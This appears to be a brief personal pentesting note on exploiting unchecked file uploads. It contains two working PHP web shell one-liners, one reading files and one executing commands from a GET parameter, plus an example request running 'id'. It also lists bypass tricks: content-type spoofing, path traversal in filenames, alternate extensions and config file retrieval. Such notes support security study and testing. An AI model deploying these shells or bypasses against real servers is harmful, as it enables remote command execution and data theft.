# file upload
when files are uploaded
and not checked

its possible to upload fe a webshell
and then acces the webshell

## uploads
<?php echo file_get_contents('/path/to/target/file'); ?>

<?php echo system($_GET['command']); ?>
xample/exploit.php?command=id HTTP/1.1

## formdata
sometimes it only checks if a content type is image/png or something
you can ez do it in burpsuite
or with js see "script/file_upload_blob.js" you could just execute this in console

## path traversal
sometimes using path traversal techniques can be used in the filename

## extensions
or filename extension of lesser known could be used
.php5
.shtml

## server side preventions
some config files are used to prevent access or execution of certain files
these might be interesting to try to retrieve if possible 
.htaccess
web.config
